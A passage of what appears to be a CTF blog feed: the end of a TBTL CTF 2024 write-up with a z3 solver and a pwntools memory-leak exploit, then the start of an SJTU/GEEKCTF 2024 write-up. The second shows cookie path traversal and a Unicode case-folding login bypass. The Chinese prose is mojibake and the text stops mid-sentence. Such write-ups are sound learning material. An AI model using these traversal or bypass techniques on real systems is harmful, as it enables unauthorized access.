- <span class="number">1</span></span><br><span class="line">        v11 = inside_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v10 = outside_index + <span class="number">1</span></span><br><span class="line">        v11 = inside_index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v10 &lt; <span class="number">0</span> <span class="keyword">or</span> v10 == <span class="number">31</span> <span class="keyword">or</span> v11 &lt; <span class="number">0</span> <span class="keyword">or</span> v11 == <span class="number">31</span>:</span><br><span class="line">        <span class="keyword">if</span> v9 == <span class="number">1</span>:</span><br><span class="line">            outside_index += inside_index == <span class="number">30</span></span><br><span class="line">            inside_index += inside_index &lt; <span class="number">30</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inside_index += outside_index == <span class="number">30</span></span><br><span class="line">            outside_index += outside_index &lt; <span class="number">30</span></span><br><span class="line">        v9 = <span class="number">1</span> - v9</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        outside_index = v10</span><br><span class="line">        inside_index = v11</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>*<span class="number">31</span>):</span><br><span class="line">        flag += <span class="built_in">str</span>(m[<span class="built_in">input</span>[i]])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª 31*31 çš„ç”±0å’Œ1ç»„æˆçš„çŸ©é˜µï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000000000000000000</span><br><span class="line">0111111100100011010010011111110</span><br><span class="line">0100000101101100111100010000010</span><br><span class="line">0101110100111001100001010111010</span><br><span class="line">0101110101101010111100010111010</span><br><span class="line">0101110100010110000001010111010</span><br><span class="line">0100000101010011100001010000010</span><br><span class="line">0111111101010101010101011111110</span><br><span class="line">0000000000000100110111000000000</span><br><span class="line">0111110111110110001011101010100</span><br><span class="line">0001001010100010010001111111100</span><br><span class="line">0101000110101111111101001100000</span><br><span class="line">0100110011111000100100100110100</span><br><span class="line">0001010101101010101111001011000</span><br><span class="line">0000011001110110011001000101000</span><br><span class="line">0111000100100011101001010111000</span><br><span class="line">0111110001010100010000011110110</span><br><span class="line">0100101111000111000000000110100</span><br><span class="line">0101101000100011011011101110100</span><br><span class="line">0100011100011101101001111011000</span><br><span class="line">0101100011011001100001101010100</span><br><span class="line">0100100100111000110001111101000</span><br><span class="line">0000000001010110000111000101000</span><br><span class="line">0111111101100011110011010100000</span><br><span class="line">0100000100000110010101000100000</span><br><span class="line">0101110101000101101101111111110</span><br><span class="line">0101110101000000010011101110110</span><br><span class="line">0101110101111100100111011100100</span><br><span class="line">0100000101101001110010101000100</span><br><span class="line">0111111101111000111110011111000</span><br><span class="line">0000000000000000000000000000000</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªçŸ©é˜µçš„å‘¨å›´ä¸€åœˆéƒ½æ˜¯0ï¼Œå¦‚æœæŠŠå‘¨å›´è¿™ä¸€åœˆ0éƒ½å»æ‰ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ª29*29çš„çŸ©é˜µã€‚æŠŠ0çœ‹æˆç™½è‰²ï¼Œ1çœ‹æˆé»‘è‰²ï¼Œé‚£ä¹ˆè¿™ä¸ªçŸ©é˜µçœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ª29*29çš„ç¬¬ä¸‰ä»£äºŒç»´ç ï¼Œå†™è„šæœ¬å°†01çŸ©é˜µè½¬æ¢ä¸ºäºŒç»´ç å›¾ç‰‡ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># convert to qrcode</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">31</span></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(MAX, MAX))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(flag[i] == <span class="string">'1'</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br><span class="line"><span class="comment"># TBTL{Wh47_D1d_H3_5aY_D34r?_D14g0nal1y...}</span></span><br></pre></td></tr></tbody></table></figure><p>æ‰«æäºŒç»´ç å°±å¯ä»¥è·å¾— flag ã€‚</p><h2 id="Enough-with-the-averages"><a href="#Enough-with-the-averages" class="headerlink" title="Enough with the averages"></a>Enough with the averages</h2><p>è¿™æ˜¯ä¸€é“åˆ©ç”¨äº†scanfå‡½æ•°ç‰¹æ€§çš„pwné¢˜ã€‚</p><p>è¿™é“é¢˜å…è®¸æˆ‘ä»¬è¾“å…¥20ä¸ª4å­—èŠ‚é•¿çš„æ•´æ•°ï¼Œç„¶åè¾“å‡ºè¿™20ä¸ªæ•´æ•°çš„å¹³å‡å€¼ã€‚ä½†æ˜¯å­˜å‚¨è¿™äº›æ•´æ•°çš„å†…å­˜åŒºåŸŸå«æœ‰å…ˆå‰è¯»å–çš„flagã€‚</p><p>è¿™ä¸ªç¨‹åºä½¿ç”¨20ä¸ª <code>__isoc99_scanf("%d", &amp;v3[i]);</code> æ¥è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥äº†ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆä»æ­¤ä»¥åçš„scanféƒ½ä¼šç›´æ¥è¿”å›-1ï¼Œå¯¼è‡´å¯¹åº”å†…å­˜åŒºåŸŸçš„4å­—èŠ‚ä¸ºåŸæ¥çš„å€¼ï¼Œæœ€ç»ˆå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p><p>æˆ‘çš„æƒ³æ³•æ˜¯ï¼šé¦–å…ˆè¾“å…¥19ä¸ª0ï¼Œç„¶åè¾“å…¥ä¸€ä¸ªaï¼Œå°±å¯ä»¥å¾—åˆ°ç›®æ ‡å†…å­˜åŒºåŸŸçš„ç¬¬20ä¸ª4å­—èŠ‚(data[19])ï¼›ç„¶åå¯åŠ¨å¦ä¸€ä¸ªç¨‹åºï¼Œè¾“å…¥18ä¸ª0ï¼Œç„¶åè¾“å…¥ä¸€ä¸ªaï¼Œå°±å¯ä»¥å¾—åˆ°data[18]+data[19]ï¼Œè®¡ç®—å¯å¾—data[18]ï¼Œä¾æ¬¡ç±»æ¨å¯ä»¥å¾—åˆ°ç›®æ ‡åŒºåŸŸçš„æ‰€æœ‰20*4ä¸ªå­—èŠ‚ã€‚ç„¶åå°±å¯ä»¥é‡æ„å‡ºflagã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = binary = ELF(<span class="string">'./chall'</span>)</span><br><span class="line">context.log_level = <span class="string">'critical'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we need record 20 int numbers</span></span><br><span class="line">numbers = [<span class="number">0</span>] * <span class="number">20</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">number</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b':'</span>, number)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_average</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b'Average score is '</span>)</span><br><span class="line">    byte_string = p.recvline().strip()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">float</span>(byte_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># p = binary.process()</span></span><br><span class="line">    p = remote(<span class="string">'0.cloud.chals.io'</span>, <span class="number">10198</span>)</span><br><span class="line"></span><br><span class="line">    zeros = <span class="number">19</span> - i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'zeros: <span class="subst">{zeros}</span>'</span>)</span><br><span class="line">    <span class="comment"># input zeros times of 0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(zeros):</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">b'0'</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">b'a'</span>)</span><br><span class="line">    average_score = recv_average()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'average_score: <span class="subst">{average_score}</span>'</span>)</span><br><span class="line">    tmp = <span class="built_in">sum</span></span><br><span class="line">    <span class="built_in">sum</span> = average_score * <span class="number">20</span></span><br><span class="line">    numbers[zeros] = <span class="built_in">int</span>(<span class="built_in">sum</span> - tmp)</span><br><span class="line">    <span class="keyword">if</span> numbers[zeros] &lt; <span class="number">0</span>:</span><br><span class="line">        numbers[zeros] = <span class="number">0x100000000</span> + numbers[zeros]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'numbers[<span class="subst">{zeros}</span>]: <span class="subst">{<span class="built_in">hex</span>(numbers[zeros])}</span>'</span>)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">20</span>):</span><br><span class="line">    char1 = numbers[i] &amp; <span class="number">0xff</span></span><br><span class="line">    char2 = (numbers[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    char3 = (numbers[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    char4 = (numbers[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>([char1, char2, char3, char4])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># TBTL{e4t_Y0ur_vegG13s_1n1714l1z3_y0ur_d4rn_v4r14bl35}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Fun!!! æ„Ÿè°¢ä¸»åŠæ–¹ï¼Œéš¾åº¦æ¢¯åº¦åšå¾—å¾ˆå¥½ã€‚</p>]]></content>
    
    
    <summary type="html">TBTL CTF 2024 ä¸ªäººé¢˜è§£ï¼ˆWith Anon CTFï¼‰ã€‚</summary>
    
    
    
    <category term="CTF" scheme="https://blog.beacox.space/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://blog.beacox.space/tags/PWN/"/>
    
    <category term="Crypto" scheme="https://blog.beacox.space/tags/Crypto/"/>
    
    <category term="Misc" scheme="https://blog.beacox.space/tags/Misc/"/>
    
    <category term="Reverse" scheme="https://blog.beacox.space/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>SJTU CTF 2024 æš¨ GEEKCTF 2024 WriteUp</title>
    <link href="https://blog.beacox.space/posts/sjtuctf-2024-wp/"/>
    <id>https://blog.beacox.space/posts/sjtuctf-2024-wp/</id>
    <published>2024-04-26T06:30:00.000Z</published>
    <updated>2024-04-26T06:30:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹æ‰“CTFä»¥æ¥åšå‡ºé¢˜ç›®æœ€å¤šçš„ä¸€æ¬¡ã€‚è¿™æ¬¡çš„é¢˜ç›®æ˜¯ SJTU CTF 2024 æ ¡å†…èµ›å’Œç¬¬ä¸€å±Š GEEKCTF å…±ç”¨çš„ã€‚æ‰€æœ‰é¢˜ç›®éƒ½å¯ä»¥åœ¨<a href="https://geekctf.geekcon.top/">GEEKCTFå®˜ç½‘</a>æ‰¾åˆ°ï¼Œç”±äºæˆ‘æ˜¯åœ¨æ ¡å†…å¹³å°åšçš„ï¼Œflagå¯èƒ½ä¼šç•¥æœ‰ä¸åŒï¼Œä½†æ˜¯è§£é¢˜çš„æ–¹æ³•åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Secrets"><a href="#Secrets" class="headerlink" title="Secrets"></a>Secrets</h3><p>æœ¬é¢˜çš„æ¼æ´ç‚¹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–+ç‰¹æ®Šå­—ç¬¦ç»•è¿‡upper/lowerã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><p>é€‰ä¸€ä¸ªä¸»é¢˜åï¼Œåœ¨ç™»å½•é¡µé¢æŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>redirectCustomAsset</code>è·¯ç”±</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,en-US;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: asset=assets/css/pico.cyan.min.css</span><br></pre></td></tr></tbody></table></figure><p>çœ‹ä¸Šå»æ˜¯ç”¨æ¥è¯»å–ä¸åŒä¸»é¢˜çš„cssæ–‡ä»¶ï¼Œä½†æ˜¯æ˜¯ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ç›¸å¯¹è·¯å¾„ã€‚å› æ­¤çŒœæµ‹å¯ä»¥è¯»å–ç½‘ç«™ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><p>åœ¨ç™»é™†é¡µé¢æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°bodyåé¢æœ‰ä¸€ä¸²çœ‹ä¸æ‡‚çš„ç¼–ç ï¼Œæ”¾åˆ°cyberchefé‡Œä¸€ä¸ªä¸ªè¯•å‘ç°æ˜¯Base85ï¼š</p><p><a href="https://gchq.github.io/CyberChef/#recipe=From_Base85('!-u',true,'z')&amp;input=L2RnVSZTRG9jYGlmbnM5QDtwMDxFLVZmTVBhcGB0SkR1ZkQrQ1Q%2BNEFUVnUjaWZvJDsrPF1bLlNEb2NgaWZuczlAcmxcdWlmbyQ7KzxdWy5KZmwwWWlmb3RtUF5xYlhKMDhmRkByRXUuRC43J3Mvbz48Py9uOHNEJEtAOyUrPFZmZFBfKCMjK1FBV1VpZm51UVBeamxxQmspJzZAPSEnOkFNLmg2REQjRj9Fc2dva0pmbDBZaWZvJDsrPF1bLlNEb2NgaWZuczlFK3JnIy9uL1g%2BQU0uaDZERCNGP0VzZ29rSmZsMFlpZm8kOys8XVsuU0RvY2BpZm5zOUUrcmcjL245MDhERCNkP0REI0Y/RXNnb2tKZmwwWWlmbyQ7KzxdWy5TRG9jYGlmbnM5RStyZyMvblQ2OUJRSWxyL28%2BPD8vbjhzRCRLQDslKzxWZmRQXygjIytRQVdVaWZudVFQXmpscUJrKSc2QjYlUXBERCNkP0REI0Y/RXNnb2tKZmwwWWlmbyQ7KzxdWy5TRG9jYGlmbnM5RStyZyMvbl0zOUdxTnJKREQjRj9Fc2dva0pmbDBZaWZvJDsrPF1bLlNEb2NgaWZuczlFK3JnIy9ubzM2QmtNPzpELyFsP0BybFx1aWZvJDsrPF1bLkpmbDBZaWZvdG1QXnFiWEowOGZGQHJFdTdAOldxJUQvIWw/QHJsXHVpZm8kOys8XVsuSmZsMFlpZm90bVBecWJYSjA4ZkZAckV1OUJsLkU2RC8hbD9AcmxcdWlmbyQ7KzxdWy5KZmwwWWlmb3RtUF5xYlhKMDhmRkByRXU8RWFgaXVBTS5oNkREI0Y/RXNnb2tKZmwwWWlmbyQ7KzxdWy5TRG9jYGlmbnM5RStyZyMvb1lOQkNHJ0k8REQjRj9Fc2dva0pmbDBZaWZvJDsrPF1bLlNEb2NgaWZuczlFK3JnIy9vWXJNRSwwMCovbz48Py9uOHNEJEtAOyUrPFZmZFBfKCMjK1FBV1VpZm51UVBeamxxQmspJzZFLTYyP0NoNTU5Qmw1UDVGKXFdSlBfKCMjK1FBVzsrPFZmZFBhcGB0SkR1ZkQrRTIlKURfPydBQTFoXzVERCNGP0VzZ29rSmZsMFlpZm8kOys8XVsuU0RvY2BpZm5zOUUrcmcjL290SD1BMWhfNUREI0Y/RXNnb2tKZmwwWWlmbyQ7KzxdWy5TRG9jYGlmbnM5RStyZyMvb3RpO0ZDZChBQmw1UDVGKXFdSlBfKCMjK1FBVzsrPFZmZFBhcGB0SkR1ZkQrRTIlKURfPzNJRGVzISwvbz48Py9uOHNEJEtAOyUrPFZmZFBfKCMjK1FBV1VpZm51UVBeamxxQmspJzZIIkNmLkRnKmdOQmw1UDVGKXFdSlBfKCMjK1FBVzsrPFZmZFBhKDBsSkR1ZkQrRTIlKURfPz9NRElZOzlCbDVQNUYpcV1KUF8oIyMrUUFXTWlmbnVRUF5qbGtFc2dva0pmbDBZKzxWZExpZm90bVBecWJYSjA4Pz9DaT0%2BR0UrcmZ0QVRCRDxFc2dva0pmbDBZKzxWZExpZm90bVBecWJYSjA4TkRELlA%2BN0VzZ29rSmZsMFkrPFZkTGlmb3RtUF5xYlhKMDhUSEZfLFQ9L01mIjwvaG50cUJsNVA8RXNnb2tKZmwwWSs8VmRMaWZvXGVQXnFiWEowOFpIQjUpNjlDMydhQVBhcGB0SkR1ZkQrRDVoN0JrKSglREk2bWxESXRNP0dtYFBxU0RvY2BpZm5zOUUsVF08Q2doRXMvb1ooQ2lmb3RtUF5xYlhKMDhsREVIUHU5QVNsIXJGRTknVkddWDtQUGEoMGxKRHVmRCtFVjEzRSw4cylBVEoyJCs8VmZkUGFwYHRKRHVmRCtDXGMjQU0uWTxELzlQJSs8VmZkUGFwYHRKRHVmRCtER18oQVUjaEBGRFloJCs8VmRMaWZvXGVQXnFiWEowOFpIQjUpNjlCUVMqLQ">è§£ç ç»“æœ</a></p><p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯app.pyå’Œpopulate.pyã€‚</p><p>å°†<code>Cookie</code>æ”¹æˆ<code>asset=app.py</code>ä¼šå›æ˜¾hackerï¼Œæ”¹æˆ<code>asset=assets/css/../../app.py</code>å³å¯å¾—åˆ°ç½‘ç«™çš„æºä»£ç ã€‚</p><p>åœ¨<code>app.py</code>é‡Œé¢ç¡¬ç¼–ç äº†ç”¨æˆ·åå’Œå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def isEqual(a, b):</span><br><span class="line">    return a.lower() != b.lower() and a.upper() == b.upper()</span><br><span class="line">â€¦â€¦</span><br><span class="line">if isEqual(username, "alice") and isEqual(password, "start2024"):</span><br><span class="line">    session["logged_in"] = True</span><br><span class="line">    session["role"] = "user"</span><br><span class="line">    return redirect("/")</span><br></pre></td></tr></tbody></table></figure><p>ä½†æ˜¯<code>isEqual</code>è¦æ±‚ç”¨æˆ·åå’Œå¯†ç éƒ½éœ€è¦æ»¡è¶³å°å†™åŒ–åä¸ç­‰äºç¡¬ç¼–ç çš„ç”¨æˆ·å/å¯†ç ï¼Œå¤§å†™åŒ–ååˆè¦ç­‰äºã€‚ç¬¬ä¸€çœ¼çœ‹æ‡µäº†ï¼Œå°å†™ä¸ç›¸ç­‰ä½†æ˜¯å¤§å†™ç›¸ç­‰ï¼Ÿé—®ä¸‹claudeï¼š</p><p><img src="https://bu.dusays.com/2024/04/26/662b492c58255.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b492c58255.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="claudeç»“æœ"></p><p>è¿›ä¸€æ­¥æœç´¢å‘ç°upperå¯¹unicodeç‰¹æ®Šå­—ç¬¦çš„å¤„ç†æœ‰äº›é—®é¢˜ï¼Œç”¨<code>unicode</code>åŒ…è£¹èµ·æ¥æ‰ä¼šå¾—åˆ°æ­£ç¡®çš„å¤§å†™ã€‚ä¸è¿‡claudeç»™çš„å­—ç¬¦ä¼¼ä¹ä¸å¯¹ï¼Œç›´æ¥ç”¨Pythonéå†unicodeå­—ç¬¦å¥½äº†ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_replacement_char</span>(<span class="params">ch</span>):</span><br><span class="line">    <span class="comment"># éå† Unicode å­—ç¬¦èŒƒå›´ 0x0000 åˆ° 0x10FFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x110000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            char = <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">if</span> char.upper() == ch.upper() <span class="keyword">and</span> char!=ch <span class="keyword">and</span> char!=ch.upper():</span><br><span class="line">                <span class="built_in">print</span>(char)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># æŸäº› Unicode ç ç‚¹æ— æ³•è½¬æ¢ä¸ºæœ‰æ•ˆå­—ç¬¦,è·³è¿‡</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">find_replacement_char(<span class="string">'i'</span>)</span><br></pre></td></tr></tbody></table></figure><p>åªæ‰¾åˆ°äº†<code>i</code>çš„æ›¿ä»£å­—ç¬¦<code>Ä±</code>ï¼Œ<code>s</code>çš„æ›¿ä»£å­—ç¬¦<code>Å¿</code>ã€‚è¾“å…¥ç”¨æˆ·å<code>alÄ±ce</code>ï¼Œå¯†ç <code>Å¿tart2024</code>ï¼Œç™»å½•æˆåŠŸï¼</p><p>å†çœ‹çœ‹populate.pyï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> Notes, app, db</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    db.create_all()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Notes.query.filter_by(<span class="built_in">type</span>=<span class="string">"notes"</span>).first():</span><br><span class="line">        db.session.add(Notes(title=<span class="string">"Hello, world!"</span>, message=<span class="string">"This is an example note."</span>))</span><br><span class="line">        db.session.add(</span><br><span class="line">            Notes(</span><br><span class="line">                title=<span class="string">"Where's flag?"</span>,</span><br><span class="line">                message=<span class="string">"Flag is waiting for you inside secrets."</span>,</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Notes.query.filter_by(<span class="built_in">type</span>=<span class="string">"secrets"</span>).first():</span><br><span class="line">        db.session.add(</span><br><span class="line">            Notes(</span><br><span class="line">                title=<span class="string">"Secret flag"</span>,</span><br><span class="line">                message=os.environ.get(<span class="string">"FLAG"</span>, <span class="string">"fake{flag}"</span>),</span><br><span class="line">                <span class="built_in">type</span>=<span class="string">"secrets"</span>,</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    db.session.commit()</span><br></pre></td></tr></tbody></table></figure><p>ä¹Ÿå°±æ˜¯è¯´â€œtype=secretsâ€ä¼šç»™æˆ‘ä»¬flagï¼Œä½†æ˜¯åœ¨app.pyé‡Œè¿˜æœ‰è¿‡æ»¤ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> = request.args.get(<span class="string">"type"</span>, <span class="string">"notes"</span>).strip()</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"secrets"</span> <span class="keyword">in</span> <span class="built_in">type</span>.lower() <span class="keyword">or</span> <span class="string">"SECRETS"</span> <span class="keyword">in</span> <span class="built_in">type</span>.upper()) <span class="keyword">and</span> session.get(</span><br><span class="line">    <span class="string">"role"</span></span><br><span class="line">) != <span class="string">"admin"</span>:</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">"index.html"</span>,</span><br><span class="line">        notes=[],</span><br><span class="line">        error=<span class="string">"You are not admin. Only admin can view secre&lt;u&gt;ts&lt;/u&gt;."</span>,</span><br><span class="line">    )</span><br><span class="line">q = db.session.query(Notes)</span><br><span class="line">q = q.<span class="built_in">filter</span>(Notes.<span class="built_in">type</span> == <span class="built_in">type</span>)</span><br><span class="line">notes = q.<span class="built_in">all</span>()</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, notes=notes)</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬éœ€è¦è®©andå‰é¢çš„é€»è¾‘è¡¨è¾¾å¼ä¸ºå¦æ‰èƒ½å¤Ÿä¸è¿”å›é”™è¯¯ã€è·å¾—flagã€‚</p><p>å› 